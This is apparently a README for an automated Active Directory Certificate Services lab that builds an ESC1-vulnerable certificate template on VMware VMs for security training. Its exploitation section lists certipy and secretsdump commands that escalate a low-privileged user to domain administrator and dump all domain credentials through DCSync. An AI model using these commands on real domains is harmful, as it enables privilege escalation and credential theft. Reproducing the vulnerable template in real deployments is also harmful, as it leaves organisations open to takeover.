# AD Attack Scenario - ESC1 Vulnerability Lab

This repository contains a fully automated Active Directory Certificate Services (AD CS) ESC1 vulnerability lab environment.

## 🎯 What This Lab Does

Demonstrates the **ESC1 vulnerability** - a critical AD CS misconfiguration that allows privilege escalation from a low-privileged domain user to Domain Administrator by exploiting certificate templates that allow Subject Alternative Name (SAN) specification.

## 📋 Prerequisites

Before starting, ensure you have the following installed on your host:

### Required Software

1. **VMware Workstation/Desktop** (16.0 or later)
   ```bash
   # Ubuntu/Debian
   # Download from VMware website or use:
   sudo apt-get install vmware-workstation
   
   # macOS
   # Download VMware Fusion from VMware website
   ```

2. **Vagrant** (2.3.0 or later) with VMware plugin
   ```bash
   # Install Vagrant
   sudo apt-get install vagrant  # Ubuntu/Debian
   brew install vagrant          # macOS
   
   # Install VMware Vagrant plugin
   vagrant plugin install vagrant-vmware-desktop
   ```

3. **Ansible** (2.10 or later)
   ```bash
   # Ubuntu/Debian
   sudo apt-get install ansible
   
   # macOS (using Homebrew)
   brew install ansible
   
   # Or using pip
   pip3 install ansible
   ```

4. **Python winrm** (for Ansible Windows support)
   ```bash
   pip3 install pywinrm
   ```

### System Requirements

- **RAM**: At least 16 GB (20 GB recommended)
- **Disk Space**: At least 80 GB free
- **CPU**: 4 cores minimum (8 cores recommended)

## 🚀 Quick Start

### 1. Clone the Repository

```bash
git clone https://github.com/omar1111eamsa/ad-attack-senario.git
cd ad-attack-senario
```

### 2. Navigate to Vagrant Directory

```bash
cd scenario-1/infra/vagrant
```

### 3. Start the Environment

```bash
vagrant up
```

**This single command will:**
- Create 4 VMs (DC, CA, Win10, Kali Attacker)
- Install Windows Server with Active Directory
- Configure Certificate Authority
- Create ESC1 vulnerable template
- Configure LDAPS
- Set up test user account
- Install attack tools on Kali

**⏱️ First run takes 30-60 minutes** depending on your internet speed and hardware.

### 3b. VMware note (Windows networking)

VMware often does **not** auto-configure the private NIC IPs on Windows guests. This repo handles that automatically during `vagrant up`:

- The `Vagrantfile` runs a **host-side trigger** after the `attacker` VM is up.
- That trigger executes `scenario-1/infra/vagrant/auto-provision.sh`, which:
  - **Bootstraps Windows private IPs** via WinRM port-forwarding (no manual IP config needed)
  - Runs the full Ansible `playbooks/site.yml`

If you need to re-run provisioning manually:

```bash
cd scenario-1/infra/vagrant
./auto-provision.sh
```

### 4. Wait for Provisioning

The setup is fully automated. You'll see Ansible playbooks running automatically. Wait until you see:

```
==> attacker: Running action triggers after up ...
==> attacker: Bootstrapping Windows IPs and provisioning lab (host-side)
==> [auto] --- Phase 1: Bootstrap Windows private-network IPs (DC, CA, Win10) ---
==> [auto] --- Phase 2: Full lab provisioning (site.yml) ---
...
PLAY RECAP *********************************************************************
dc                         : ok=XX    changed=XX    ...
ca                         : ok=XX    changed=XX    ...
```

## 🎓 Exploiting ESC1

### SSH into Attacker Machine

```bash
vagrant ssh attacker
```

### Run the Attack Commands

```bash
# Step 1: Request certificate as Administrator (ESC1 Exploit)
certipy req -u jdoe@serini.lab -p 'Summer2024!' -ca SERINI-CA -target ca.serini.lab -template VulnUserAuth -upn administrator@serini.lab

# Step 2: Authenticate with certificate and get hash
certipy auth -pfx administrator.pfx -dc-ip 192.168.58.10

# Step 3: DCSync - Dump all domain credentials
secretsdump.py -hashes :HASH_FROM_STEP_2 administrator@192.168.58.10
```

Replace `HASH_FROM_STEP_2` with the NT hash you received in step 2.

## 🏗️ Lab Architecture

```
┌─────────────────────┐
│   Domain Controller │
│   (dc.serini.lab)   │
│   192.168.58.10     │
└──────────┬──────────┘
           │
           │
┌──────────┴──────────┐       ┌─────────────────────┐
│        CA           │       │   Windows 10 Client │
│  (ca.serini.lab)    │       │  (win10.serini.lab) │
│  192.168.58.20      │       │   192.168.58.40     │
└─────────────────────┘       └─────────────────────┘
           │
           │
┌──────────┴──────────┐
│   Kali Attacker     │
│     (attacker)      │
│   192.168.58.50     │
└─────────────────────┘
```

## 📂 Project Structure

```
.
├── scenario-1/
│   ├── docs/
│   │   └── attack-guide.md           # Detailed attack walkthrough
│   ├── infra/
│   │   ├── ansible/
│   │   │   ├── playbooks/
│   │   │   │   ├── site.yml          # Master playbook
│   │   │   │   ├── 00-network.yml    # Network setup
│   │   │   │   ├── 00-bootstrap-network-forwarded.yml # Bootstrap IPs via forwarded WinRM
│   │   │   │   ├── 01-domain.yml     # AD Domain setup
│   │   │   │   ├── 02-adcs.yml       # Certificate Authority
│   │   │   │   ├── 06-esc1-template.yml  # Vulnerable template
│   │   │   │   └── 08-ldaps-config.yml   # LDAPS configuration
│   │   │   ├── inventory.yml
│   │   │   └── ansible.cfg
│   │   └── vagrant/
│   │       └── Vagrantfile            # VM definitions
│   └── scripts/
│       ├── 01-create-vulnerable-template.ps1
│       └── 02-create-test-user.ps1
└── README.md
```

## 🔧 Useful Commands

### VM Management

```bash
# Start all VMs
vagrant up

# Stop all VMs
vagrant halt

# Destroy all VMs (clean slate)
vagrant destroy -f

# Check VM status
vagrant status

# SSH into specific VM
vagrant ssh dc       # Domain Controller
vagrant ssh ca       # Certificate Authority
vagrant ssh win10    # Windows 10 client
vagrant ssh attacker # Kali attacker
```

**VMware GUI:** This lab is configured to **show the VM windows** in VMware (`v.gui = true`). If you want headless mode, set `v.gui = false` in `scenario-1/infra/vagrant/Vagrantfile`.

### Re-run Provisioning

If you need to re-run the Ansible setup:

```bash
# Re-run bootstrap + provisioning (recommended)
cd scenario-1/infra/vagrant
./auto-provision.sh
```

Note: this repo uses a **host-side trigger** during `vagrant up` (not a guest provisioner). `vagrant provision` alone may do nothing unless you run `./auto-provision.sh`.

## 🧪 Manual Ansible Execution

If you want to run Ansible playbooks manually:

```bash
cd scenario-1/infra/ansible

# Run all playbooks
ansible-playbook -i inventory.yml playbooks/site.yml

# Run specific playbook
ansible-playbook -i inventory.yml playbooks/06-esc1-template.yml
```

## 🔐 Default Credentials

### Domain Admin
- **Username**: `SERINI\Administrator`
- **Password**: `P@ssw0rd123!`

### Test User (for exploitation)
- **Username**: `jdoe`
- **Password**: `Summer2024!`
- **Domain**: `serini.lab`

### Kali Attacker
- **Username**: `vagrant`
- **Password**: `vagrant`

## 🐛 Troubleshooting

### VMs Not Starting

```bash
# Check VMware VMs
vmrun list

# Or use Vagrant status
vagrant status
```

### VMware Network Configuration Issue

VMware often cannot auto-configure secondary network adapters on Windows VMs.

This repo now auto-bootstraps Windows IPs during `vagrant up` via `auto-provision.sh`.

If you still need to fix a Windows VM manually, open PowerShell as Administrator and run (example for DC):

```powershell
# DC: 192.168.58.10
$adapter = Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object -Last 1
New-NetIPAddress -InterfaceIndex $adapter.ifIndex -IPAddress 192.168.58.10 -PrefixLength 24
Set-DnsClientServerAddress -InterfaceIndex $adapter.ifIndex -ServerAddresses 192.168.58.10

# CA: Change IP to 192.168.58.20
# Win10: Change IP to 192.168.58.40
```

Alternatively, use the provided scripts in `scenario-1/scripts/configure-network-*.ps1`.

After configuring networks, re-run:

```bash
cd scenario-1/infra/vagrant
./auto-provision.sh
```

**Provisioning order:** `00-network.yml` runs first (static IPs + DNS on Windows). If Ansible cannot reach a Windows host, fix networking and then re-run `./auto-provision.sh`.

### Ansible Connection Errors

```bash
# Test WinRM connectivity
ansible dc -i scenario-1/infra/ansible/inventory.yml -m win_ping
```

### GPO / "Not associated with Active Directory domain or forest"

If `03-software-gpo` fails with that error, the playbook now uses `-Domain serini.lab` for Get-GPO/New-GPO. Ensure `01-domain` and `02-adcs` have completed (including reboots) before `03-software-gpo` runs.

### ESC1 Exploitation Failing

1. Ensure LDAPS is configured:
   ```bash
   cd scenario-1/infra/ansible
   ansible-playbook -i inventory.yml playbooks/08-ldaps-config.yml
   ```

2. Verify template permissions:
   ```bash
   ansible-playbook -i inventory.yml playbooks/99-fix-enroll-permission.yml
   ```

3. Check DNS on Kali:
   ```bash
   vagrant ssh attacker -c "cat /etc/hosts | grep serini"
   ```

## 📚 Learning Resources

- [AD CS ESC1 Vulnerability Details](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [Certipy Documentation](https://github.com/ly4k/Certipy)
- [Active Directory Security](https://adsecurity.org/)

## ⚠️ Disclaimer

This lab is for **educational purposes only**. Only use these techniques in authorized environments. Unauthorized access to computer systems is illegal.

## 📝 License

MIT License - See LICENSE file for details

## 🤝 Contributing

Feel free to open issues or submit pull requests to improve this lab!

## 👨‍💻 Author

Created for Active Directory security training and ESC1 vulnerability demonstration.
